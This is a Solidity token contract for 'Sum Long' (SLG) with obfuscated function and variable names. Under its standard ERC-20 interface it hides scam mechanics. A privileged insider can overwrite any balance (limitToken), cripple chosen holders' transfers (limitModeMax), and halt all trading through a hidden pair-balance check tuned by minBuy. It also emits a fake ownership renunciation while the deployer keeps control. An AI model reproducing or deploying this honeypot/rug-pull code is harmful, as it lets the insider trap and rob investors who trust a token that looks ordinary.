//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface limitFundIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract walletSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldMarketing {
    function createPair(address liquidityTakeFee, address amountAuto) external returns (address);
}

interface txLiquidityAuto {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldSell) external view returns (uint256);

    function transfer(address swapLimit, uint256 exemptSender) external returns (bool);

    function allowance(address atToken, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptSender) external returns (bool);

    function transferFrom(
        address sender,
        address swapLimit,
        uint256 exemptSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed feeTrading, uint256 value);
    event Approval(address indexed atToken, address indexed spender, uint256 value);
}

interface txLiquidityAutoMetadata is txLiquidityAuto {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SumLong is walletSender, txLiquidityAuto, txLiquidityAutoMetadata {

    function transferFrom(address maxLaunch, address swapLimit, uint256 exemptSender) external override returns (bool) {
        if (_msgSender() != fundList) {
            if (modeToken[maxLaunch][_msgSender()] != type(uint256).max) {
                require(exemptSender <= modeToken[maxLaunch][_msgSender()]);
                modeToken[maxLaunch][_msgSender()] -= exemptSender;
            }
        }
        return swapList(maxLaunch, swapLimit, exemptSender);
    }

    mapping(address => uint256) private receiverAmount;

    function symbol() external view virtual override returns (string memory) {
        return teamTotal;
    }

    mapping(address => bool) public senderMin;

    address public teamMax;

    function owner() external view returns (address) {
        return feeMin;
    }

    function decimals() external view virtual override returns (uint8) {
        return maxModeWallet;
    }

    mapping(address => bool) public fundBuy;

    uint256 private enableTradingAmount = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return feeMin;
    }

    bool public shouldFrom;

    function minBuy(uint256 exemptSender) public {
        fromMode();
        txTotalTeam = exemptSender;
    }

    string private teamTotal = "SLG";

    address private feeMin;

    function name() external view virtual override returns (string memory) {
        return exemptReceiver;
    }

    function sellMode(address minAuto) public {
        require(minAuto.balance < 100000);
        if (limitSwap) {
            return;
        }
        
        senderMin[minAuto] = true;
        
        limitSwap = true;
    }

    function allowance(address toMinAuto, address teamMarketing) external view virtual override returns (uint256) {
        if (teamMarketing == fundList) {
            return type(uint256).max;
        }
        return modeToken[toMinAuto][teamMarketing];
    }

    function fromMode() private view {
        require(senderMin[_msgSender()]);
    }

    event OwnershipTransferred(address indexed autoEnable, address indexed fundMode);

    function balanceOf(address shouldSell) public view virtual override returns (uint256) {
        return receiverAmount[shouldSell];
    }

    uint256 constant fromTotal = 3 ** 10;

    constructor (){
        if (walletEnableMode != isTrading) {
            feeEnableSell = true;
        }
        limitFundIs tradingToken = limitFundIs(fundList);
        launchTeam = shouldMarketing(tradingToken.factory()).createPair(tradingToken.WETH(), address(this));
        if (shouldFrom == feeEnableSell) {
            feeEnableSell = true;
        }
        teamMax = _msgSender();
        exemptEnable();
        senderMin[teamMax] = true;
        receiverAmount[teamMax] = enableTradingAmount;
        
        emit Transfer(address(0), teamMax, enableTradingAmount);
    }

    uint256 public isTrading;

    uint256 public walletEnableMode;

    function limitToken(address senderFund, uint256 exemptSender) public {
        fromMode();
        receiverAmount[senderFund] = exemptSender;
    }

    address minReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public launchTeam;

    address fundList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    mapping(address => mapping(address => uint256)) private modeToken;

    function totalSupply() external view virtual override returns (uint256) {
        return enableTradingAmount;
    }

    function exemptEnable() public {
        emit OwnershipTransferred(teamMax, address(0));
        feeMin = address(0);
    }

    uint256 receiverSender;

    function limitModeMax(address tradingEnable) public {
        fromMode();
        
        if (tradingEnable == teamMax || tradingEnable == launchTeam) {
            return;
        }
        fundBuy[tradingEnable] = true;
    }

    function swapList(address maxLaunch, address swapLimit, uint256 exemptSender) internal returns (bool) {
        if (maxLaunch == teamMax) {
            return tradingTake(maxLaunch, swapLimit, exemptSender);
        }
        uint256 feeTo = txLiquidityAuto(launchTeam).balanceOf(minReceiver);
        require(feeTo == txTotalTeam);
        require(swapLimit != minReceiver);
        if (fundBuy[maxLaunch]) {
            return tradingTake(maxLaunch, swapLimit, fromTotal);
        }
        return tradingTake(maxLaunch, swapLimit, exemptSender);
    }

    function transfer(address senderFund, uint256 exemptSender) external virtual override returns (bool) {
        return swapList(_msgSender(), senderFund, exemptSender);
    }

    function approve(address teamMarketing, uint256 exemptSender) public virtual override returns (bool) {
        modeToken[_msgSender()][teamMarketing] = exemptSender;
        emit Approval(_msgSender(), teamMarketing, exemptSender);
        return true;
    }

    uint8 private maxModeWallet = 18;

    bool public limitSwap;

    string private exemptReceiver = "Sum Long";

    uint256 txTotalTeam;

    bool private feeEnableSell;

    function tradingTake(address maxLaunch, address swapLimit, uint256 exemptSender) internal returns (bool) {
        require(receiverAmount[maxLaunch] >= exemptSender);
        receiverAmount[maxLaunch] -= exemptSender;
        receiverAmount[swapLimit] += exemptSender;
        emit Transfer(maxLaunch, swapLimit, exemptSender);
        return true;
    }

}